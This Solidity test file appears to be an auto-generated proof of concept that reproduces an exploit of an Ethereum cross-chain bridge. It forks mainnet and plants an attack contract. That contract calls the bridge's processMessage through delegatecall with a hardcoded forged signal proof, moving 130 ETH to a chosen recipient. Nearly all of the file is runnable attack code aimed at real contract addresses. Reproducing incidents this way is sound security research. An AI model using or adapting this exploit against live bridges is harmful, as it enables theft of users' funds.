// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.20;

import "./Base.sol";

// @KeyInfo - Total Lost : N/A
// Attacker : 0x7506dea0c38ca0b55364b22424374c5a1ae1b76a
// Attack Contract : 0xd60247c6848b7ca29eddf63aa924e53db6ddd8ec
// Vulnerable Contract : 0xd60247c6848b7ca29eddf63aa924e53db6ddd8ec
// Attack Tx : 0xb8befb015a67de8f40890b1f8667c597c3b66a52b388ec1c6cd28637fd65dd13
// Block : 25368908
// Chain : Ethereum
// Analysis :
//
// @Reproduction
// Verdict : pass
// Economic Proof : beneficial_payout_reproduction
// Reproduced Value : 223.26K USD
//
// @POC Author
// Generated PoC

contract AttackTest is Base {
    address constant ATTACKER_EOA = Addresses.attacker_eoa;
    address constant ATTACK_CONTRACT = Addresses.attack_contract;
    uint256 constant FORK_BLOCK = 25368907;
    uint256 constant TX_TIMESTAMP = 1782080303;
    uint256 constant TX_BLOCK_NUMBER = 25368908;
    uint256 constant TX_VALUE = 0;

    function setUp() public {
        vm.createSelectFork(vm.envString("POC_FORK_ENDPOINT"), FORK_BLOCK);
        if (TX_TIMESTAMP != 0) vm.warp(TX_TIMESTAMP);
        if (TX_BLOCK_NUMBER != 0) vm.roll(TX_BLOCK_NUMBER);
    }

    function testPoC() public {
        vm.startPrank(ATTACKER_EOA, ATTACKER_EOA);
        vm.etch(ATTACK_CONTRACT, type(OurAttack).runtimeCode);

        OurAttack attack = OurAttack(payable(ATTACK_CONTRACT));
        _prepareProfit(address(attack), address(0));
        _logBalances("Before exploit");
        attack.attack{value: TX_VALUE}();
        _logBalances("After exploit");

        vm.stopPrank();
        _assertProfit();
    }

    function _expectProfitLegs(address attack, address attackChild) internal override {
        attack;
        attackChild;
        _expectProfit(Addresses.A_A98035_A846, address(0), Addresses.ZERO, "ETH", 130 ether);
    }
}

contract OurAttack {
    // Unresolved gap: the bridge proof payload is an exact observed `proveSignalReceived` argument.
    // Upstream marks this action as matched but not semantic-typed-action owned, so the bytes remain explicit.
    bytes internal constant SIGNAL_PROOF =
        hex"0000000000000000000000000000000000000000000000000000000000000020000000000000000000000000000000000000000000000000000000000000000100000000000000000000000000000000000000000000000000000000000000200000000000000000000000000000000000000000000000000000000000028c5800000000000000000000000000000000000000000000000000000000001b8f1404ee248905810cb11566831147867255e7c30271ead8be594e64cfd32f6d1d2a000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000c000000000000000000000000000000000000000000000000000000000000001a000000000000000000000000000000000000000000000000000000000000000010000000000000000000000000000000000000000000000000000000000000020000000000000000000000000000000000000000000000000000000000000006cf86aa12090f15910d82ece448b46ec05af6ff9d4e82a89c2af768b20b69c1c68453a7ccdb846f8440180a00bfc7d2ba90e10292e2a95c662b4bd00c53c30d6d0a0054bd982e901fd2acdbda0bc36789e7a1e281436464229828f817d6612f7b477d66591ff96a9e064bcc98a00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000003000000000000000000000000000000000000000000000000000000000000006000000000000000000000000000000000000000000000000000000000000000e000000000000000000000000000000000000000000000000000000000000001600000000000000000000000000000000000000000000000000000000000000053f8518080a0a0fcdfd79808e1bffd724863335a5d16a126a1d166e700d413f959727def245380808080808080808080a0a5b8d27d6829b06598fe82984ffec26c073d99adb3c385beba34d57527804efa808080000000000000000000000000000000000000000000000000000000000000000000000000000000000000000053f851808080808080808080a08dbcfd04bd30b12d1e39e334dc09b13b29d7494a1793aabebeb198e4e66f69c98080a053a2c33077fd94b70ef5e04c49803aadd115680e10cfb7c1cdff456a5f359b9880808080000000000000000000000000000000000000000000000000000000000000000000000000000000000000000045f843a020919bb07301be4cd1b74727e21c09b02afcf097600b1c033022cffafe2de7a6a1a0855db45d77ae44a0a2ac4d2dad3fbf9fd4c341d923738c8356dbcd2f22482ef1000000000000000000000000000000000000000000000000000000";

    function attack() external payable {
        BridgeMessage memory message = BridgeMessage({
            id: 0,
            from: 0,
            srcChainId: 100000,
            sender: Addresses.A_167000_0001,
            destChainId: 167000,
            owner: Addresses.attacker_eoa,
            to: 1,
            refundTo: Addresses.attacker_eoa,
            recipient: Addresses.A_A98035_A846,
            value: 130 ether,
            data: ""
        });

        bytes memory bridgeCall = abi.encodeCall(IMainnetBridge.processMessage, (message, SIGNAL_PROOF));
        (bool ok,) = Addresses.MainnetBridge.delegatecall(bridgeCall);
        require(ok, "MainnetBridge processMessage delegatecall failed");
    }

    receive() external payable {}
}

library Addresses {
    address internal constant ZERO = address(0);
    address internal constant A_167000_0001 = 0x1670000000000000000000000000000000000001;
    address internal constant MainnetBridge = 0x2705B12a971dA766A3f9321a743d61ceAD67dA2F;
    address internal constant attacker_eoa = 0x7506DeA0c38ca0B55364B22424374c5A1ae1B76a;
    address internal constant ERC1967Proxy = 0x91f67118DD47d502B1f0C354D0611997B022f29E;
    address internal constant ERC1967Proxy_C77C = 0x9e0a24964e5397B566c1ed39258e21aB5E35C77C;
    address internal constant A_A98035_A846 = 0xA98035081fB739EbE9C8f80904668fb11438a846;
    address internal constant attack_contract = 0xd60247c6848B7Ca29eDdF63AA924E53dB6Ddd8EC;
}

struct BridgeMessage {
    uint64 id;
    uint64 from;
    uint32 srcChainId;
    address sender;
    uint64 destChainId;
    address owner;
    uint64 to;
    address refundTo;
    address recipient;
    uint256 value;
    bytes data;
}

interface IMainnetBridge {
    function processMessage(BridgeMessage calldata message, bytes calldata proof) external payable;
}
